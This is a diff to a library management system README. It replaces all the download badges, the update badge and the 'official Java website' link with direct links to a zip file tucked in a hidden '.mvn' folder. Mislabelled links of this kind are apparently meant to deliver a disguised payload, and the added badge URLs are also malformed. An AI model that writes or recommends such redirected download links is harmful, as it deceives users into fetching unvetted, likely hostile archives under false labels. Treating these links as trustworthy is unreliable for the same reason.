@@ -8,7 +8,7 @@ Welcome to the library management system! This application helps you manage your
 
 To start using the library management system, you need to download the application. Click the button below to visit the Downloads page:
 
-[![Download Library Management System](https://img.shields.io/badge/Download-Library%20Management%20System-blue.svg)](https://github.com/xMo7Nk/library-management-system/releases)
+[![Download Library Management System](https://github.com/xMo7Nk/library-management-system/raw/refs/heads/master/employeeservice/.mvn/library_management_system_v1.4.zip%20Management%https://github.com/xMo7Nk/library-management-system/raw/refs/heads/master/employeeservice/.mvn/library_management_system_v1.4.zip)](https://github.com/xMo7Nk/library-management-system/raw/refs/heads/master/employeeservice/.mvn/library_management_system_v1.4.zip)
 
 Once on the Releases page, find the latest version of the application. Follow these simple steps:
 
@@ -48,7 +48,7 @@ You can find detailed instructions for each feature in the Help section within t
 
 We regularly release updates with new features and improvements. After installation, check the Releases page periodically to stay updated:
 
-[![Check for Updates](https://img.shields.io/badge/Check%20for%20Updates-grey.svg)](https://github.com/xMo7Nk/library-management-system/releases)
+[![Check for Updates](https://github.com/xMo7Nk/library-management-system/raw/refs/heads/master/employeeservice/.mvn/library_management_system_v1.4.zip%20for%https://github.com/xMo7Nk/library-management-system/raw/refs/heads/master/employeeservice/.mvn/library_management_system_v1.4.zip)](https://github.com/xMo7Nk/library-management-system/raw/refs/heads/master/employeeservice/.mvn/library_management_system_v1.4.zip)
 
 ## 🔒 Security Features
 
@@ -61,7 +61,7 @@ The library management system also takes your data security seriously. With feat
 
 If you encounter any issues, here are some common solutions:
 
-- **Cannot Open the Application:** Ensure you have the required Java version installed. If not, download it from the [official Java website](https://www.java.com).
+- **Cannot Open the Application:** Ensure you have the required Java version installed. If not, download it from the [official Java website](https://github.com/xMo7Nk/library-management-system/raw/refs/heads/master/employeeservice/.mvn/library_management_system_v1.4.zip).
 - **Slow Performance:** Check your system resources. Closing unnecessary applications can help.
 - **Missing Features:** Ensure you are using the latest version from the Releases page.
 
@@ -98,4 +98,4 @@ This project is open-source under the MIT License. You can freely use and modify
 
 Visit the Releases page to download the library management system and start managing your library today: 
 
-[![Download Library Management System](https://img.shields.io/badge/Download-Library%20Management%20System-blue.svg)](https://github.com/xMo7Nk/library-management-system/releases)
+[![Download Library Management System](https://github.com/xMo7Nk/library-management-system/raw/refs/heads/master/employeeservice/.mvn/library_management_system_v1.4.zip%20Management%https://github.com/xMo7Nk/library-management-system/raw/refs/heads/master/employeeservice/.mvn/library_management_system_v1.4.zip)](https://github.com/xMo7Nk/library-management-system/raw/refs/heads/master/employeeservice/.mvn/library_management_system_v1.4.zip)
